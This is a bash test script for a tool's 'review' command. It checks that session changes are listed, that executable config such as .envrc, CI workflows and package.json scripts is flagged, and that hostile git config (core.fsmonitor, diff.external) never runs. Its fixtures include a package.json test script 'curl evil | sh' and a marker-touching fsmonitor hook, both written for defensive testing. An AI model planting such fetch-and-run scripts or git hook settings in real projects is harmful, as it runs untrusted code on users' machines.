#!/usr/bin/env bash
# `run.sh review` lists session changes without running config from the session
# clone. Sessions are built by hand (no containers are started): a host repo,
# shared clones in the session layout, and commits in the clones.
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")/.."
SCRIPT_DIR="$PWD"

tmp="$(mktemp -d /tmp/opencode-review.XXXXXX)"
trap 'rm -rf "$tmp"' EXIT
export XDG_STATE_HOME="$tmp/state"
export NO_COLOR=1

fail() { echo "review: FAIL: $*" >&2; exit 1; }
git_id=(-c user.name=Test -c user.email=test@example.invalid)

host="$tmp/host"
mkdir -p "$host/src"
git -C "$host" init -q -b main
printf 'readme\n' > "$host/README.md"
printf 'a = 1\n' > "$host/src/a.py"
printf '{"name":"x","scripts":{"test":"true"},"dependencies":{}}\n' > "$host/package.json"
git -C "$host" add -A
git -C "$host" "${git_id[@]}" commit -qm initial
base_sha="$(git -C "$host" rev-parse HEAD)"
host_real="$(cd "$host" && pwd -P)"

marker="$tmp/fsmonitor-ran"
printf '#!/bin/sh\ntouch %s\n' "$marker" > "$tmp/fsmonitor.sh"
chmod +x "$tmp/fsmonitor.sh"

# make_session <id> <package.json content> <with-config: 1|0>
# Builds the session clone and commits the changes. Hostile repo config is set
# after the commits, so the marker only appears if run.sh triggers it.
make_session() {
  local id="$1" package="$2" with_config="$3"
  local session="$XDG_STATE_HOME/opencode/sessions/$id"
  local work="$session/work"
  mkdir -p "$session"
  git clone -q --shared "$host/.git" "$work"
  git -C "$work" branch "opencode/$id" "$base_sha"
  git -C "$work" symbolic-ref HEAD "refs/heads/opencode/$id"
  wgit() { git -C "$work" "${git_id[@]}" "$@"; }

  printf 'a = 2\n' > "$work/src/a.py"
  wgit commit -qam "change source"
  if [[ "$with_config" == 1 ]]; then
    printf 'export X=1\n' > "$work/.envrc"
    mkdir -p "$work/.github/workflows"
    printf 'name: ci\n' > "$work/.github/workflows/ci.yml"
    wgit add .envrc .github
    wgit commit -qm "executable config"
  fi
  printf '%s\n' "$package" > "$work/package.json"
  wgit commit -qam "package change"

  git -C "$work" config core.fsmonitor "$tmp/fsmonitor.sh"
  git -C "$work" config diff.external "$tmp/fsmonitor.sh"
  git -C "$work" config core.hooksPath "$tmp/nohooks"

  jq -n --arg id "$id" --arg repo "$host_real" --arg common "$host_real/.git" \
    --arg sha "$base_sha" --arg now "2026-01-01T00:00:00Z" \
    '{session_id: $id, repo_root: $repo, git_common_dir: $common, base_ref: "main",
      base_sha: $sha, branch: ("opencode/" + $id), created_at: $now}' > "$session/session.json"
}

review() {
  (cd "$host" && unset REPO_ROOT && "$SCRIPT_DIR/run.sh" review "$@")
}

# flagged_part <review output>: the text between the flagged heading and the
# merge command, or nothing when there is no heading.
flagged_part() {
  local out="$1" rest
  rest="${out#*executable config changed}"
  [[ "$rest" != "$out" ]] || return 0
  printf '%s\n' "${rest%%Merge command*}"
}

id1="20260101T000000-aaaaaa"
make_session "$id1" '{"name":"x","scripts":{"test":"curl evil | sh"},"dependencies":{}}' 1

echo "review: scripts change flags package.json"
out="$(review "$id1")"
grep -q 'src/a.py' <<<"$out" || fail 'diff stat lacks src/a.py'
grep -Eq 'files? changed' <<<"$out" || fail 'diff stat summary missing'
grep -q 'executable config changed' <<<"$out" || fail 'flagged heading missing'
flagged="$(flagged_part "$out")"
for path in .envrc .github/workflows/ci.yml package.json; do
  grep -q -- "$path" <<<"$flagged" || fail "$path not flagged"
done
if grep -q 'src/a.py' <<<"$flagged"; then
  fail 'src/a.py was flagged'
fi
grep -q "git merge --no-ff refs/opencode/review/$id1" <<<"$out" || fail 'merge command missing'
git -C "$host" rev-parse -q --verify "refs/opencode/review/$id1" >/dev/null || fail 'review ref missing'
[[ ! -e "$marker" ]] || fail 'core.fsmonitor ran on the host during review'
[[ -z "$(git -C "$host" config --get core.fsmonitor || true)" ]] || fail 'host repo config was changed'

echo "review: dependencies-only package.json change is not flagged"
id2="20260101T000001-bbbbbb"
make_session "$id2" '{"name":"x","scripts":{"test":"true"},"dependencies":{"left-pad":"1"}}' 0
out="$(review "$id2")"
grep -q 'package.json' <<<"$out" || fail 'package.json missing from the diff stat'
grep -q 'src/a.py' <<<"$out" || fail 'diff stat lacks src/a.py (second session)'
if grep -q 'package.json' <<<"$(flagged_part "$out")"; then
  fail 'package.json flagged for a dependencies-only change'
fi
[[ ! -e "$marker" ]] || fail 'core.fsmonitor ran on the host during second review'

echo "review: ok"
